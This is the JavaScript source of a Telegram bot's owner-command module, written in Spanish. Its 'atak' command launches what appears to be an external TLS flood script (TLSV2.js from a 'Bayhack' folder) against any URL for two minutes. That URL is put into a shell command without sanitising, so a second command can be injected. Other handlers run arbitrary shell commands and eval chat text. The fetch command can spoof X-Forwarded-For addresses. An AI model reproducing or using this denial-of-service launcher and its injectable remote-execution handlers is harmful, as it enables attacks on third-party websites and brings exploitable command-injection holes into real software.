const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const { execSync, exec } = require('child_process');
const axios = require('axios');
const { isCreator } = require('../utils');
require('../settings');

module.exports = (bot) => {
bot.hears(/actualizar|update/i, async (conn) => {
const userId = conn.from.id.toString();
if (!isCreator(userId)) return conn.reply('Acceso denegado.', { reply_to_message_id: conn.message.message_id });
try {
const stdout = execSync('git pull');
await conn.reply(stdout.toString().trim(), { reply_to_message_id: conn.message.message_id });
} catch (error) {
await conn.reply('Error al actualizar.', { reply_to_message_id: conn.message.message_id });
}
});

bot.hears(/infofile|getfileinfo/i, async (conn) => {
const userId = conn.from.id.toString();
if (!isCreator(userId)) return conn.reply('Acceso denegado.', { reply_to_message_id: conn.message.message_id });
const message = conn.message.reply_to_message;
if (!message || (!message.document && !message.photo && !message.video && !message.audio)) {
return conn.reply('❌ Responde a un archivo, imagen, video o audio.', { reply_to_message_id: conn.message.message_id });
}
try {
let fileId;
if (message.document) fileId = message.document.file_id;
else if (message.photo) fileId = message.photo[message.photo.length - 1].file_id;
else if (message.video) fileId = message.video.file_id;
else if (message.audio) fileId = message.audio.file_id;
const fileInfo = await conn.telegram.getFile(fileId);
await conn.reply(`\n\`\`\`json\n${JSON.stringify(fileInfo, null, 2)}\n\`\`\``, { parse_mode: 'Markdown', reply_to_message_id: conn.message.message_id });
} catch (error) {
await conn.reply('❌ Error al obtener la información.', { reply_to_message_id: conn.message.message_id });
}
});

bot.hears(/agregarpropietario|addowner/i, async (conn) => {
const ownersPath = path.join(__dirname, '../config/owners.json');
let ownersData = JSON.parse(fs.readFileSync(ownersPath, 'utf-8')).owners;
const userId = conn.from.id.toString();
const args = conn.message.text.split(' ').slice(1);
if (!ownersData.some(owner => owner.id === userId)) return conn.reply('Acceso denegado.', { reply_to_message_id: conn.message.message_id });
if (args.length === 0) return conn.reply('Uso incorrecto. Proporciona un ID.', { reply_to_message_id: conn.message.message_id });
const newOwnerId = args[0];
const newOwnerName = args.slice(1).join(' ') || 'SinNombre';
if (ownersData.some(owner => owner.id === newOwnerId)) return conn.reply('Este usuario ya es propietario.', { reply_to_message_id: conn.message.message_id });
ownersData.push({ id: newOwnerId, name: newOwnerName });
fs.writeFileSync(ownersPath, JSON.stringify({ owners: ownersData }, null, 4));
return conn.reply(`Nuevo propietario:\nID: ${newOwnerId}\nNombre: ${newOwnerName}`, { reply_to_message_id: conn.message.message_id });
});

bot.hears(/eliminarpropietario|removeowner/i, async (conn) => {
const ownersPath = path.join(__dirname, '../config/owners.json');
let ownersData = JSON.parse(fs.readFileSync(ownersPath, 'utf-8')).owners;
const userId = conn.from.id.toString();
const firstName = conn.from.first_name;
if (userId !== "6990618983" || firstName !== "Eliasar YT") return conn.reply('Acceso denegado.', { reply_to_message_id: conn.message.message_id });
const args = conn.message.text.split(' ').slice(1);
if (args.length === 0) return conn.reply('Uso incorrecto. Proporciona un ID.', { reply_to_message_id: conn.message.message_id });
const removeOwnerId = args[0];
if (!ownersData.some(owner => owner.id === removeOwnerId)) return conn.reply('El usuario no es propietario.', { reply_to_message_id: conn.message.message_id });
ownersData = ownersData.filter(owner => owner.id !== removeOwnerId);
fs.writeFileSync(ownersPath, JSON.stringify({ owners: ownersData }, null, 4));
return conn.reply(`Propietario eliminado:\nID: ${removeOwnerId}`, { reply_to_message_id: conn.message.message_id });
});

bot.hears(/obtener|get/i, async (conn) => {
const userId = conn.from.id.toString();
if (!isCreator(userId)) return conn.reply('Acceso denegado.', { reply_to_message_id: conn.message.message_id });
const args = conn.message.text.split(' ').slice(1);
if (args.length === 0) return conn.reply('Uso incorrecto. Proporciona una URL.', { reply_to_message_id: conn.message.message_id });
const url = args[0];
const options = args.slice(1);
try {
let response;
const config = { responseType: 'arraybuffer' };
if (options.includes('--post')) response = await axios.post(url, { key: 'value' }, config);
else if (options.includes('--pro')) {
config.headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9,es;q=0.8',
'Connection': 'keep-alive',
'Cache-Control': 'max-age=0',
'Upgrade-Insecure-Requests': '1',
'DNT': '1',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-User': '?1',
'TE': 'Trailers',
'Referer': url,
'Origin': url,
'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
'Cookie': '_ga=GA1.2.123456789.123456789; _gid=GA1.2.987654321.987654321;',
'Authorization': `Bearer ${process.env.TOKEN || 'default_token'}`,
};
config.timeout = 10000;
response = await axios.get(url, config);
} else response = await axios.get(url, config);
const contentType = response.headers['content-type'];
if (contentType.includes('image')) await conn.replyWithPhoto({ source: Buffer.from(response.data) });
else if (contentType.includes('video')) await conn.replyWithVideo({ source: Buffer.from(response.data) });
else if (contentType.includes('json')) {
const jsonPath = path.join(__dirname, 'response.json');
fs.writeFileSync(jsonPath, response.data);
await conn.replyWithDocument({ source: jsonPath });
fs.unlinkSync(jsonPath);
} else if (contentType.includes('html') || contentType.includes('text')) {
const textData = response.data.toString();
if (textData.length > 4000) {
const textPath = path.join(__dirname, 'response.txt');
fs.writeFileSync(textPath, textData);
await conn.replyWithDocument({ source: textPath });
fs.unlinkSync(textPath);
} else await conn.reply(textData, { reply_to_message_id: conn.message.message_id });
}
} catch (error) {
await conn.reply('Error: ' + error.message, { reply_to_message_id: conn.message.message_id });
}
});

bot.hears(/^=>\s*(.*)/, async (conn) => {
const userId = conn.from.id.toString();
if (!isCreator(userId)) {
return conn.reply('Acceso denegado. Este comando solo está disponible para el propietario del bot.', { reply_to_message_id: conn.message.message_id });
}

const code = conn.message.text.slice(2).trim();
if (!code) {
return conn.reply('Uso incorrecto. Proporciona el código a ejecutar.', { reply_to_message_id: conn.message.message_id });
}

try {
const result = eval(code);
const output = typeof result === 'object' ? JSON.stringify(result, null, 2) : result.toString();
await conn.reply(output.length > 4000 ? output.slice(0, 4000) + '...' : output, { reply_to_message_id: conn.message.message_id });
} catch (error) {
await conn.reply(error.message, { reply_to_message_id: conn.message.message_id });
}
});

bot.hears(/atak/i, async (conn) => {
const userId = conn.from.id.toString();
if (!isCreator(userId)) return conn.reply('Acceso denegado.', { reply_to_message_id: conn.message.message_id });

const args = conn.message.text.split(' ').slice(1);
if (args.length === 0) return conn.reply('Uso incorrecto. Proporciona una URL.', { reply_to_message_id: conn.message.message_id });

const url = args[0];
const attackCommand = `cd Bayhack && node TLSV2.js ${url} 500 8 1`;

let message = await conn.reply('Attack starting ☠️', { reply_to_message_id: conn.message.message_id });

setTimeout(async () => {
try {
await conn.telegram.editMessageText(conn.chat.id, message.message_id, undefined, 'Attacking ☠️...');
} catch (err) {}
}, 5000);

setTimeout(async () => {
try {
await conn.telegram.editMessageText(conn.chat.id, message.message_id, undefined, 'Attack finished ☠️');
} catch (err) {}
}, 120000);

const attackProcess = exec(attackCommand);
setTimeout(() => attackProcess.kill(), 120000);
});

bot.hears(/\$|\s*exec/i, async (conn) => {
const userId = conn.from.id.toString();
if (!isCreator(userId)) return conn.reply('Acceso denegado.', { reply_to_message_id: conn.message.message_id });
const command = conn.message.text.replace(/^\$|\s*exec/, '').trim();
if (!command) return conn.reply('Proporciona el comando a ejecutar.', { reply_to_message_id: conn.message.message_id });
exec(command, (error, stdout, stderr) => {
if (error) return conn.reply(`${error.message}`, { reply_to_message_id: conn.message.message_id });
if (stderr) return conn.reply(`Stderr: ${stderr}`, { reply_to_message_id: conn.message.message_id });
conn.reply(stdout.length > 4000 ? stdout.slice(0, 4000) + '...' : stdout, { reply_to_message_id: conn.message.message_id });
});
});

fs.watchFile(require.resolve(__filename), () => {
fs.unwatchFile(require.resolve(__filename));
const fileName = path.basename(__filename);
console.log(chalk.greenBright.bold(`Update '${fileName}'.`));
delete require.cache[require.resolve(__filename)];
require(__filename);
});
};